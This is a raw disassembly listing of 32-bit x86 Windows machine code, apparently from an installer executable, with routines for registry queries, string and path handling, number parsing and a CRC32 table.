  406569:	ff 75 0c             	push   0xc(%ebp)
  40656c:	50                   	push   %eax
  40656d:	ff 15 28 80 40 00    	call   *0x408028
  406573:	5d                   	pop    %ebp
  406574:	c2 10 00             	ret    $0x10
  406577:	55                   	push   %ebp
  406578:	8b ec                	mov    %esp,%ebp
  40657a:	8d 45 10             	lea    0x10(%ebp),%eax
  40657d:	50                   	push   %eax
  40657e:	ff 75 08             	push   0x8(%ebp)
  406581:	e8 42 ff ff ff       	call   0x4064c8
  406586:	33 c9                	xor    %ecx,%ecx
  406588:	3b c1                	cmp    %ecx,%eax
  40658a:	75 05                	jne    0x406591
  40658c:	6a 06                	push   $0x6
  40658e:	58                   	pop    %eax
  40658f:	eb 15                	jmp    0x4065a6
  406591:	51                   	push   %ecx
  406592:	ff 75 14             	push   0x14(%ebp)
  406595:	51                   	push   %ecx
  406596:	ff 75 10             	push   0x10(%ebp)
  406599:	51                   	push   %ecx
  40659a:	51                   	push   %ecx
  40659b:	51                   	push   %ecx
  40659c:	ff 75 0c             	push   0xc(%ebp)
  40659f:	50                   	push   %eax
  4065a0:	ff 15 2c 80 40 00    	call   *0x40802c
  4065a6:	5d                   	pop    %ebp
  4065a7:	c2 10 00             	ret    $0x10
  4065aa:	55                   	push   %ebp
  4065ab:	8b ec                	mov    %esp,%ebp
  4065ad:	51                   	push   %ecx
  4065ae:	8d 45 18             	lea    0x18(%ebp),%eax
  4065b1:	56                   	push   %esi
  4065b2:	50                   	push   %eax
  4065b3:	8b 45 18             	mov    0x18(%ebp),%eax
  4065b6:	f7 d8                	neg    %eax
  4065b8:	1b c0                	sbb    %eax,%eax
  4065ba:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  4065c1:	25 00 01 00 00       	and    $0x100,%eax
  4065c6:	0d 19 00 02 00       	or     $0x20019,%eax
  4065cb:	50                   	push   %eax
  4065cc:	ff 75 0c             	push   0xc(%ebp)
  4065cf:	ff 75 08             	push   0x8(%ebp)
  4065d2:	e8 72 ff ff ff       	call   0x406549
  4065d7:	8b 75 14             	mov    0x14(%ebp),%esi
  4065da:	85 c0                	test   %eax,%eax
  4065dc:	75 3c                	jne    0x40661a
  4065de:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4065e1:	57                   	push   %edi
  4065e2:	50                   	push   %eax
  4065e3:	8d 45 0c             	lea    0xc(%ebp),%eax
  4065e6:	56                   	push   %esi
  4065e7:	50                   	push   %eax
  4065e8:	6a 00                	push   $0x0
  4065ea:	ff 75 10             	push   0x10(%ebp)
  4065ed:	ff 75 18             	push   0x18(%ebp)
  4065f0:	ff 15 08 80 40 00    	call   *0x408008
  4065f6:	ff 75 18             	push   0x18(%ebp)
  4065f9:	8b f8                	mov    %eax,%edi
  4065fb:	ff 15 10 80 40 00    	call   *0x408010
  406601:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  406608:	00 
  406609:	85 ff                	test   %edi,%edi
  40660b:	5f                   	pop    %edi
  40660c:	75 0c                	jne    0x40661a
  40660e:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  406612:	74 0a                	je     0x40661e
  406614:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  406618:	74 04                	je     0x40661e
  40661a:	66 83 26 00          	andw   $0x0,(%esi)
  40661e:	5e                   	pop    %esi
  40661f:	c9                   	leave
  406620:	c2 14 00             	ret    $0x14
  406623:	ff 74 24 08          	push   0x8(%esp)
  406627:	68 18 84 40 00       	push   $0x408418
  40662c:	ff 74 24 0c          	push   0xc(%esp)
  406630:	ff 15 2c 82 40 00    	call   *0x40822c
  406636:	83 c4 0c             	add    $0xc,%esp
  406639:	c2 08 00             	ret    $0x8
  40663c:	55                   	push   %ebp
  40663d:	8b ec                	mov    %esp,%ebp
  40663f:	51                   	push   %ecx
  406640:	51                   	push   %ecx
  406641:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406644:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406648:	53                   	push   %ebx
  406649:	56                   	push   %esi
  40664a:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  40664e:	6a 0a                	push   $0xa
  406650:	58                   	pop    %eax
  406651:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  406658:	6a 39                	push   $0x39
  40665a:	5b                   	pop    %ebx
  40665b:	75 06                	jne    0x406663
  40665d:	41                   	inc    %ecx
  40665e:	41                   	inc    %ecx
  40665f:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406663:	66 83 39 30          	cmpw   $0x30,(%ecx)
  406667:	75 27                	jne    0x406690
  406669:	41                   	inc    %ecx
  40666a:	41                   	inc    %ecx
  40666b:	66 8b 11             	mov    (%ecx),%dx
  40666e:	66 83 fa 30          	cmp    $0x30,%dx
  406672:	72 0c                	jb     0x406680
  406674:	66 83 fa 37          	cmp    $0x37,%dx
  406678:	77 06                	ja     0x406680
  40667a:	6a 08                	push   $0x8
  40667c:	58                   	pop    %eax
  40667d:	6a 37                	push   $0x37
  40667f:	5b                   	pop    %ebx
  406680:	0f b7 d2             	movzwl %dx,%edx
  406683:	83 e2 df             	and    $0xffffffdf,%edx
  406686:	83 fa 58             	cmp    $0x58,%edx
  406689:	75 05                	jne    0x406690
  40668b:	6a 10                	push   $0x10
  40668d:	41                   	inc    %ecx
  40668e:	58                   	pop    %eax
  40668f:	41                   	inc    %ecx
  406690:	0f b7 11             	movzwl (%ecx),%edx
  406693:	41                   	inc    %ecx
  406694:	41                   	inc    %ecx
  406695:	83 fa 30             	cmp    $0x30,%edx
  406698:	7c 0c                	jl     0x4066a6
  40669a:	0f b7 f3             	movzwl %bx,%esi
  40669d:	3b d6                	cmp    %esi,%edx
  40669f:	7f 05                	jg     0x4066a6
  4066a1:	83 ea 30             	sub    $0x30,%edx
  4066a4:	eb 1b                	jmp    0x4066c1
  4066a6:	66 3d 10 00          	cmp    $0x10,%ax
  4066aa:	75 23                	jne    0x4066cf
  4066ac:	8b f2                	mov    %edx,%esi
  4066ae:	83 e6 df             	and    $0xffffffdf,%esi
  4066b1:	83 fe 41             	cmp    $0x41,%esi
  4066b4:	7c 19                	jl     0x4066cf
  4066b6:	83 fe 46             	cmp    $0x46,%esi
  4066b9:	7f 14                	jg     0x4066cf
  4066bb:	83 e2 07             	and    $0x7,%edx
  4066be:	83 c2 09             	add    $0x9,%edx
  4066c1:	0f b7 f0             	movzwl %ax,%esi
  4066c4:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  4066c8:	03 f2                	add    %edx,%esi
  4066ca:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4066cd:	eb c1                	jmp    0x406690
  4066cf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4066d2:	5e                   	pop    %esi
  4066d3:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  4066d7:	5b                   	pop    %ebx
  4066d8:	c9                   	leave
  4066d9:	c2 04 00             	ret    $0x4
  4066dc:	68 00 04 00 00       	push   $0x400
  4066e1:	ff 74 24 0c          	push   0xc(%esp)
  4066e5:	ff 74 24 0c          	push   0xc(%esp)
  4066e9:	ff 15 94 80 40 00    	call   *0x408094
  4066ef:	c2 08 00             	ret    $0x8
  4066f2:	ff 25 98 80 40 00    	jmp    *0x408098
  4066f8:	ff 25 54 81 40 00    	jmp    *0x408154
  4066fe:	33 c0                	xor    %eax,%eax
  406700:	50                   	push   %eax
  406701:	50                   	push   %eax
  406702:	ff 74 24 14          	push   0x14(%esp)
  406706:	ff 74 24 14          	push   0x14(%esp)
  40670a:	6a ff                	push   $0xffffffff
  40670c:	ff 74 24 18          	push   0x18(%esp)
  406710:	50                   	push   %eax
  406711:	50                   	push   %eax
  406712:	ff 15 90 80 40 00    	call   *0x408090
  406718:	c3                   	ret
  406719:	8b 44 24 08          	mov    0x8(%esp),%eax
  40671d:	83 ec 10             	sub    $0x10,%esp
  406720:	85 c0                	test   %eax,%eax
  406722:	7d 11                	jge    0x406735
  406724:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  40672a:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  406731:	2b c8                	sub    %eax,%ecx
  406733:	8b 01                	mov    (%ecx),%eax
  406735:	8b 0d 98 9a 42 00    	mov    0x429a98,%ecx
  40673b:	53                   	push   %ebx
  40673c:	55                   	push   %ebp
  40673d:	56                   	push   %esi
  40673e:	57                   	push   %edi
  40673f:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  406742:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406746:	b8 00 7a 42 00       	mov    $0x427a00,%eax
  40674b:	3b c8                	cmp    %eax,%ecx
  40674d:	8b f0                	mov    %eax,%esi
  40674f:	0f 82 0a 02 00 00    	jb     0x40695f
  406755:	8b d1                	mov    %ecx,%edx
  406757:	2b d0                	sub    %eax,%edx
  406759:	d1 fa                	sar    $1,%edx
  40675b:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406761:	0f 83 f8 01 00 00    	jae    0x40695f
  406767:	83 64 24 24 00       	andl   $0x0,0x24(%esp)
  40676c:	8b f1                	mov    %ecx,%esi
  40676e:	e9 ec 01 00 00       	jmp    0x40695f
  406773:	8b ce                	mov    %esi,%ecx
  406775:	2b c8                	sub    %eax,%ecx
  406777:	83 e1 fe             	and    $0xfffffffe,%ecx
  40677a:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406780:	0f 8d e5 01 00 00    	jge    0x40696b
  406786:	6a 02                	push   $0x2
  406788:	59                   	pop    %ecx
  406789:	03 f9                	add    %ecx,%edi
  40678b:	66 83 fd 04          	cmp    $0x4,%bp
  40678f:	0f 83 b7 01 00 00    	jae    0x40694c
  406795:	8a 4f 01             	mov    0x1(%edi),%cl
  406798:	8a 07                	mov    (%edi),%al
  40679a:	8a d1                	mov    %cl,%dl
  40679c:	8a d8                	mov    %al,%bl
  40679e:	83 e2 7f             	and    $0x7f,%edx
  4067a1:	83 e3 7f             	and    $0x7f,%ebx
  4067a4:	c1 e2 07             	shl    $0x7,%edx
  4067a7:	0f b6 c0             	movzbl %al,%eax
  4067aa:	0b d3                	or     %ebx,%edx
  4067ac:	8b d8                	mov    %eax,%ebx
  4067ae:	89 54 24 28          	mov    %edx,0x28(%esp)
  4067b2:	ba 00 80 00 00       	mov    $0x8000,%edx
  4067b7:	0b da                	or     %edx,%ebx
  4067b9:	6a 02                	push   $0x2
  4067bb:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4067bf:	89 44 24 18          	mov    %eax,0x18(%esp)
  4067c3:	0f b6 d9             	movzbl %cl,%ebx
  4067c6:	8b cb                	mov    %ebx,%ecx
  4067c8:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4067cc:	0b ca                	or     %edx,%ecx
  4067ce:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4067d2:	59                   	pop    %ecx
  4067d3:	03 f9                	add    %ecx,%edi
  4067d5:	66 3b e9             	cmp    %cx,%bp
  4067d8:	0f 85 12 01 00 00    	jne    0x4068f0
  4067de:	33 ed                	xor    %ebp,%ebp
  4067e0:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  4067e4:	39 2d e4 9a 42 00    	cmp    %ebp,0x429ae4
  4067ea:	74 08                	je     0x4067f4
  4067ec:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  4067f3:	00 
  4067f4:	84 c0                	test   %al,%al
  4067f6:	79 38                	jns    0x406830
  4067f8:	8b c8                	mov    %eax,%ecx
  4067fa:	83 e0 3f             	and    $0x3f,%eax
  4067fd:	83 e1 40             	and    $0x40,%ecx
  406800:	51                   	push   %ecx
  406801:	8b 0d 98 9a 42 00    	mov    0x429a98,%ecx
  406807:	56                   	push   %esi
  406808:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  40680b:	50                   	push   %eax
  40680c:	68 20 84 40 00       	push   $0x408420
  406811:	68 02 00 00 80       	push   $0x80000002
  406816:	e8 8f fd ff ff       	call   0x4065aa
  40681b:	66 39 2e             	cmp    %bp,(%esi)
  40681e:	0f 85 b4 00 00 00    	jne    0x4068d8
  406824:	53                   	push   %ebx
  406825:	56                   	push   %esi
  406826:	e8 ee fe ff ff       	call   0x406719
  40682b:	e9 a3 00 00 00       	jmp    0x4068d3
  406830:	83 f8 25             	cmp    $0x25,%eax
  406833:	75 11                	jne    0x406846
  406835:	68 00 04 00 00       	push   $0x400
  40683a:	56                   	push   %esi
  40683b:	ff 15 58 81 40 00    	call   *0x408158
  406841:	e9 8d 00 00 00       	jmp    0x4068d3
  406846:	83 f8 24             	cmp    $0x24,%eax
  406849:	75 10                	jne    0x40685b
  40684b:	68 00 04 00 00       	push   $0x400
  406850:	56                   	push   %esi
  406851:	ff 15 ac 80 40 00    	call   *0x4080ac
  406857:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  40685b:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  40685f:	74 72                	je     0x4068d3
  406861:	ff 4c 24 28          	decl   0x28(%esp)
  406865:	8b 44 24 28          	mov    0x28(%esp),%eax
  406869:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  40686d:	a1 64 9a 42 00       	mov    0x429a64,%eax
  406872:	83 e3 bf             	and    $0xffffffbf,%ebx
  406875:	8b eb                	mov    %ebx,%ebp
  406877:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  40687d:	85 c0                	test   %eax,%eax
  40687f:	74 12                	je     0x406893
  406881:	56                   	push   %esi
  406882:	6a 00                	push   $0x0
  406884:	6a 00                	push   $0x0
  406886:	53                   	push   %ebx
  406887:	ff 35 68 9a 42 00    	push   0x429a68
  40688d:	ff d0                	call   *%eax
  40688f:	85 c0                	test   %eax,%eax
  406891:	74 3a                	je     0x4068cd
  406893:	6a 07                	push   $0x7
  406895:	e8 36 02 00 00       	call   0x406ad0
  40689a:	0f b6 cb             	movzbl %bl,%ecx
  40689d:	55                   	push   %ebp
  40689e:	51                   	push   %ecx
  40689f:	ff 35 68 9a 42 00    	push   0x429a68
  4068a5:	ff d0                	call   *%eax
  4068a7:	8b d8                	mov    %eax,%ebx
  4068a9:	85 db                	test   %ebx,%ebx
  4068ab:	74 15                	je     0x4068c2
  4068ad:	56                   	push   %esi
  4068ae:	53                   	push   %ebx
  4068af:	ff 15 74 81 40 00    	call   *0x408174
  4068b5:	53                   	push   %ebx
  4068b6:	8b e8                	mov    %eax,%ebp
  4068b8:	ff 15 a0 82 40 00    	call   *0x4082a0
  4068be:	85 ed                	test   %ebp,%ebp
  4068c0:	75 0b                	jne    0x4068cd
  4068c2:	66 83 26 00          	andw   $0x0,(%esi)
  4068c6:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  4068cb:	75 94                	jne    0x406861
  4068cd:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4068d1:	33 ed                	xor    %ebp,%ebp
  4068d3:	66 39 2e             	cmp    %bp,(%esi)
  4068d6:	74 10                	je     0x4068e8
  4068d8:	83 fb 1a             	cmp    $0x1a,%ebx
  4068db:	75 0b                	jne    0x4068e8
  4068dd:	68 78 84 40 00       	push   $0x408478
  4068e2:	56                   	push   %esi
  4068e3:	e8 10 fe ff ff       	call   0x4066f8
  4068e8:	56                   	push   %esi
  4068e9:	e8 9c 00 00 00       	call   0x40698a
  4068ee:	eb 4c                	jmp    0x40693c
  4068f0:	66 83 fd 03          	cmp    $0x3,%bp
  4068f4:	75 32                	jne    0x406928
  4068f6:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4068fa:	83 fb 1d             	cmp    $0x1d,%ebx
  4068fd:	75 0e                	jne    0x40690d
  4068ff:	ff 35 68 9a 42 00    	push   0x429a68
  406905:	56                   	push   %esi
  406906:	e8 18 fd ff ff       	call   0x406623
  40690b:	eb 11                	jmp    0x40691e
  40690d:	8b c3                	mov    %ebx,%eax
  40690f:	c1 e0 0b             	shl    $0xb,%eax
  406912:	05 00 a0 42 00       	add    $0x42a000,%eax
  406917:	50                   	push   %eax
  406918:	56                   	push   %esi
  406919:	e8 be fd ff ff       	call   0x4066dc
  40691e:	83 c3 eb             	add    $0xffffffeb,%ebx
  406921:	83 fb 07             	cmp    $0x7,%ebx
  406924:	73 16                	jae    0x40693c
  406926:	eb c0                	jmp    0x4068e8
  406928:	66 83 fd 01          	cmp    $0x1,%bp
  40692c:	75 0e                	jne    0x40693c
  40692e:	83 c8 ff             	or     $0xffffffff,%eax
  406931:	2b 44 24 28          	sub    0x28(%esp),%eax
  406935:	50                   	push   %eax
  406936:	56                   	push   %esi
  406937:	e8 dd fd ff ff       	call   0x406719
  40693c:	56                   	push   %esi
  40693d:	e8 b0 fd ff ff       	call   0x4066f2
  406942:	8d 34 46             	lea    (%esi,%eax,2),%esi
  406945:	b8 00 7a 42 00       	mov    $0x427a00,%eax
  40694a:	eb 13                	jmp    0x40695f
  40694c:	75 0c                	jne    0x40695a
  40694e:	66 8b 17             	mov    (%edi),%dx
  406951:	66 89 16             	mov    %dx,(%esi)
  406954:	03 f1                	add    %ecx,%esi
  406956:	03 f9                	add    %ecx,%edi
  406958:	eb 05                	jmp    0x40695f
  40695a:	66 89 2e             	mov    %bp,(%esi)
  40695d:	03 f1                	add    %ecx,%esi
  40695f:	66 8b 2f             	mov    (%edi),%bp
  406962:	66 85 ed             	test   %bp,%bp
  406965:	0f 85 08 fe ff ff    	jne    0x406773
  40696b:	66 83 26 00          	andw   $0x0,(%esi)
  40696f:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  406974:	5f                   	pop    %edi
  406975:	5e                   	pop    %esi
  406976:	5d                   	pop    %ebp
  406977:	5b                   	pop    %ebx
  406978:	74 0a                	je     0x406984
  40697a:	50                   	push   %eax
  40697b:	ff 74 24 18          	push   0x18(%esp)
  40697f:	e8 58 fd ff ff       	call   0x4066dc
  406984:	83 c4 10             	add    $0x10,%esp
  406987:	c2 08 00             	ret    $0x8
  40698a:	55                   	push   %ebp
  40698b:	56                   	push   %esi
  40698c:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406990:	57                   	push   %edi
  406991:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406995:	75 18                	jne    0x4069af
  406997:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  40699c:	75 11                	jne    0x4069af
  40699e:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  4069a3:	75 0a                	jne    0x4069af
  4069a5:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  4069aa:	75 03                	jne    0x4069af
  4069ac:	83 c6 08             	add    $0x8,%esi
  4069af:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4069b3:	74 0d                	je     0x4069c2
  4069b5:	56                   	push   %esi
  4069b6:	e8 67 f6 ff ff       	call   0x406022
  4069bb:	85 c0                	test   %eax,%eax
  4069bd:	74 03                	je     0x4069c2
  4069bf:	83 c6 04             	add    $0x4,%esi
  4069c2:	66 8b 06             	mov    (%esi),%ax
  4069c5:	8b ee                	mov    %esi,%ebp
  4069c7:	66 85 c0             	test   %ax,%ax
  4069ca:	8b fe                	mov    %esi,%edi
  4069cc:	74 40                	je     0x406a0e
  4069ce:	53                   	push   %ebx
  4069cf:	8b 1d 08 82 40 00    	mov    0x408208,%ebx
  4069d5:	66 3d 1f 00          	cmp    $0x1f,%ax
  4069d9:	76 25                	jbe    0x406a00
  4069db:	50                   	push   %eax
  4069dc:	68 cc a5 40 00       	push   $0x40a5cc
  4069e1:	e8 f2 f5 ff ff       	call   0x405fd8
  4069e6:	66 83 38 00          	cmpw   $0x0,(%eax)
  4069ea:	75 14                	jne    0x406a00
  4069ec:	56                   	push   %esi
  4069ed:	ff d3                	call   *%ebx
  4069ef:	2b c6                	sub    %esi,%eax
  4069f1:	d1 f8                	sar    $1,%eax
  4069f3:	50                   	push   %eax
  4069f4:	56                   	push   %esi
  4069f5:	57                   	push   %edi
  4069f6:	e8 8c f7 ff ff       	call   0x406187
  4069fb:	57                   	push   %edi
  4069fc:	ff d3                	call   *%ebx
  4069fe:	8b f8                	mov    %eax,%edi
  406a00:	56                   	push   %esi
  406a01:	ff d3                	call   *%ebx
  406a03:	8b f0                	mov    %eax,%esi
  406a05:	66 8b 06             	mov    (%esi),%ax
  406a08:	66 85 c0             	test   %ax,%ax
  406a0b:	75 c8                	jne    0x4069d5
  406a0d:	5b                   	pop    %ebx
  406a0e:	66 83 27 00          	andw   $0x0,(%edi)
  406a12:	57                   	push   %edi
  406a13:	55                   	push   %ebp
  406a14:	ff 15 fc 81 40 00    	call   *0x4081fc
  406a1a:	8b f8                	mov    %eax,%edi
  406a1c:	66 8b 07             	mov    (%edi),%ax
  406a1f:	66 3d 20 00          	cmp    $0x20,%ax
  406a23:	74 06                	je     0x406a2b
  406a25:	66 3d 5c 00          	cmp    $0x5c,%ax
  406a29:	75 08                	jne    0x406a33
  406a2b:	66 83 27 00          	andw   $0x0,(%edi)
  406a2f:	3b ef                	cmp    %edi,%ebp
  406a31:	72 df                	jb     0x406a12
  406a33:	5f                   	pop    %edi
  406a34:	5e                   	pop    %esi
  406a35:	5d                   	pop    %ebp
  406a36:	c2 04 00             	ret    $0x4
  406a39:	56                   	push   %esi
  406a3a:	be a0 5f 42 00       	mov    $0x425fa0,%esi
  406a3f:	56                   	push   %esi
  406a40:	ff 74 24 0c          	push   0xc(%esp)
  406a44:	ff 15 40 81 40 00    	call   *0x408140
  406a4a:	83 f8 ff             	cmp    $0xffffffff,%eax
  406a4d:	74 0b                	je     0x406a5a
  406a4f:	50                   	push   %eax
  406a50:	ff 15 38 81 40 00    	call   *0x408138
  406a56:	8b c6                	mov    %esi,%eax
  406a58:	eb 02                	jmp    0x406a5c
  406a5a:	33 c0                	xor    %eax,%eax
  406a5c:	5e                   	pop    %esi
  406a5d:	c2 04 00             	ret    $0x4
  406a60:	55                   	push   %ebp
  406a61:	8b ec                	mov    %esp,%ebp
  406a63:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  406a69:	56                   	push   %esi
  406a6a:	be 04 01 00 00       	mov    $0x104,%esi
  406a6f:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406a75:	56                   	push   %esi
  406a76:	50                   	push   %eax
  406a77:	ff 15 58 81 40 00    	call   *0x408158
  406a7d:	3b c6                	cmp    %esi,%eax
  406a7f:	5e                   	pop    %esi
  406a80:	76 02                	jbe    0x406a84
  406a82:	33 c0                	xor    %eax,%eax
  406a84:	85 c0                	test   %eax,%eax
  406a86:	74 0f                	je     0x406a97
  406a88:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  406a8f:	ff 5c 
  406a91:	74 04                	je     0x406a97
  406a93:	33 c9                	xor    %ecx,%ecx
  406a95:	eb 03                	jmp    0x406a9a
  406a97:	33 c9                	xor    %ecx,%ecx
  406a99:	41                   	inc    %ecx
  406a9a:	ff 75 08             	push   0x8(%ebp)
  406a9d:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406aa4:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  406aab:	51                   	push   %ecx
  406aac:	68 e0 a5 40 00       	push   $0x40a5e0
  406ab1:	50                   	push   %eax
  406ab2:	ff 15 2c 82 40 00    	call   *0x40822c
  406ab8:	83 c4 10             	add    $0x10,%esp
  406abb:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406ac1:	6a 08                	push   $0x8
  406ac3:	6a 00                	push   $0x0
  406ac5:	50                   	push   %eax
  406ac6:	ff 15 18 81 40 00    	call   *0x408118
  406acc:	c9                   	leave
  406acd:	c2 04 00             	ret    $0x4
  406ad0:	8b 44 24 04          	mov    0x4(%esp),%eax
  406ad4:	56                   	push   %esi
  406ad5:	8b f0                	mov    %eax,%esi
  406ad7:	57                   	push   %edi
  406ad8:	c1 e6 03             	shl    $0x3,%esi
  406adb:	8b be 08 a4 40 00    	mov    0x40a408(%esi),%edi
  406ae1:	57                   	push   %edi
  406ae2:	ff 15 60 81 40 00    	call   *0x408160
  406ae8:	85 c0                	test   %eax,%eax
  406aea:	75 0a                	jne    0x406af6
  406aec:	57                   	push   %edi
  406aed:	e8 6e ff ff ff       	call   0x406a60
  406af2:	85 c0                	test   %eax,%eax
  406af4:	74 0f                	je     0x406b05
  406af6:	ff b6 0c a4 40 00    	push   0x40a40c(%esi)
  406afc:	50                   	push   %eax
  406afd:	ff 15 5c 81 40 00    	call   *0x40815c
  406b03:	eb 02                	jmp    0x406b07
  406b05:	33 c0                	xor    %eax,%eax
  406b07:	5f                   	pop    %edi
  406b08:	5e                   	pop    %esi
  406b09:	c2 04 00             	ret    $0x4
  406b0c:	55                   	push   %ebp
  406b0d:	8b ec                	mov    %esp,%ebp
  406b0f:	83 ec 1c             	sub    $0x1c,%esp
  406b12:	56                   	push   %esi
  406b13:	8b 75 08             	mov    0x8(%ebp),%esi
  406b16:	57                   	push   %edi
  406b17:	8b 3d 84 82 40 00    	mov    0x408284,%edi
  406b1d:	eb 0a                	jmp    0x406b29
  406b1f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406b22:	50                   	push   %eax
  406b23:	ff 15 7c 82 40 00    	call   *0x40827c
  406b29:	6a 01                	push   $0x1
  406b2b:	56                   	push   %esi
  406b2c:	56                   	push   %esi
  406b2d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406b30:	6a 00                	push   $0x0
  406b32:	50                   	push   %eax
  406b33:	ff d7                	call   *%edi
  406b35:	85 c0                	test   %eax,%eax
  406b37:	75 e6                	jne    0x406b1f
  406b39:	5f                   	pop    %edi
  406b3a:	5e                   	pop    %esi
  406b3b:	c9                   	leave
  406b3c:	c2 04 00             	ret    $0x4
  406b3f:	55                   	push   %ebp
  406b40:	8b ec                	mov    %esp,%ebp
  406b42:	81 ec 00 01 00 00    	sub    $0x100,%esp
  406b48:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406b4e:	68 00 01 00 00       	push   $0x100
  406b53:	50                   	push   %eax
  406b54:	ff 75 0c             	push   0xc(%ebp)
  406b57:	e8 a2 fb ff ff       	call   0x4066fe
  406b5c:	83 c4 0c             	add    $0xc,%esp
  406b5f:	85 c0                	test   %eax,%eax
  406b61:	74 12                	je     0x406b75
  406b63:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406b69:	50                   	push   %eax
  406b6a:	ff 75 08             	push   0x8(%ebp)
  406b6d:	ff 15 5c 81 40 00    	call   *0x40815c
  406b73:	eb 02                	jmp    0x406b77
  406b75:	33 c0                	xor    %eax,%eax
  406b77:	c9                   	leave
  406b78:	c2 08 00             	ret    $0x8
  406b7b:	55                   	push   %ebp
  406b7c:	8b ec                	mov    %esp,%ebp
  406b7e:	51                   	push   %ecx
  406b7f:	56                   	push   %esi
  406b80:	8b 35 68 81 40 00    	mov    0x408168,%esi
  406b86:	57                   	push   %edi
  406b87:	6a 64                	push   $0x64
  406b89:	ff 75 08             	push   0x8(%ebp)
  406b8c:	ff d6                	call   *%esi
  406b8e:	bf 02 01 00 00       	mov    $0x102,%edi
  406b93:	eb 0e                	jmp    0x406ba3
  406b95:	6a 0f                	push   $0xf
  406b97:	e8 70 ff ff ff       	call   0x406b0c
  406b9c:	6a 64                	push   $0x64
  406b9e:	ff 75 08             	push   0x8(%ebp)
  406ba1:	ff d6                	call   *%esi
  406ba3:	3b c7                	cmp    %edi,%eax
  406ba5:	74 ee                	je     0x406b95
  406ba7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406baa:	50                   	push   %eax
  406bab:	ff 75 08             	push   0x8(%ebp)
  406bae:	ff 15 64 81 40 00    	call   *0x408164
  406bb4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bb7:	5f                   	pop    %edi
  406bb8:	5e                   	pop    %esi
  406bb9:	c9                   	leave
  406bba:	c2 04 00             	ret    $0x4
  406bbd:	83 3d f4 75 42 00 00 	cmpl   $0x0,0x4275f4
  406bc4:	56                   	push   %esi
  406bc5:	75 2d                	jne    0x406bf4
  406bc7:	33 c9                	xor    %ecx,%ecx
  406bc9:	6a 08                	push   $0x8
  406bcb:	8b c1                	mov    %ecx,%eax
  406bcd:	5e                   	pop    %esi
  406bce:	8b d0                	mov    %eax,%edx
  406bd0:	80 e2 01             	and    $0x1,%dl
  406bd3:	f6 da                	neg    %dl
  406bd5:	1b d2                	sbb    %edx,%edx
  406bd7:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406bdd:	d1 e8                	shr    $1,%eax
  406bdf:	33 c2                	xor    %edx,%eax
  406be1:	4e                   	dec    %esi
  406be2:	75 ea                	jne    0x406bce
  406be4:	89 04 8d f0 75 42 00 	mov    %eax,0x4275f0(,%ecx,4)
  406beb:	41                   	inc    %ecx
  406bec:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406bf2:	7c d5                	jl     0x406bc9
  406bf4:	8b 54 24 10          	mov    0x10(%esp),%edx
  406bf8:	8b 44 24 08          	mov    0x8(%esp),%eax
  406bfc:	85 d2                	test   %edx,%edx
  406bfe:	f7 d0                	not    %eax
  406c00:	76 23                	jbe    0x406c25
  406c02:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406c06:	57                   	push   %edi
  406c07:	0f b6 39             	movzbl (%ecx),%edi
  406c0a:	8b f0                	mov    %eax,%esi
  406c0c:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406c12:	33 f7                	xor    %edi,%esi
  406c14:	c1 e8 08             	shr    $0x8,%eax
  406c17:	8b 34 b5 f0 75 42 00 	mov    0x4275f0(,%esi,4),%esi
  406c1e:	33 c6                	xor    %esi,%eax
